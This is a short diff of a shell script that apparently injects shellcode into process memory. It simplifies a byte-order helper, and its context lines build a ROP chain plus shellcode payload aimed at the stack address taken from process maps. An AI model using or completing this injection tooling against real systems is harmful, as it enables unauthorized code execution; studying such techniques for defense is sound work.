@@ -9,16 +9,7 @@ DEBUG=0
 # Endian conversion
 endian()
 {
-    local result=""
-    result=${1:14:2}
-    result=${result}${1:12:2}
-    result=${result}${1:10:2}
-    result=${result}${1:8:2}
-    result=${result}${1:6:2}
-    result=${result}${1:4:2}
-    result=${result}${1:2:2}
-    result=${result}${1:0:2}
-    echo -n "$result"
+    echo -n ${1:14:2}${1:12:2}${1:10:2}${1:8:2}${1:6:2}${1:4:2}${1:2:2}${1:0:2}
 }
 
 # search_section "file" $filename $section
@@ -318,6 +309,7 @@ rop_len=$((${#rop} / 2))
 write_to_addr=$(echo "$dd_maps" | grep -F "[stack]" | cut -d' ' -f1 |\
                 cut -d'-' -f2)
 write_to_addr=$(((0x$write_to_addr - 1) & (~0xfff)))
+
 
 payload=$(printf %s "$rop$sc" | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
 # Have fun!
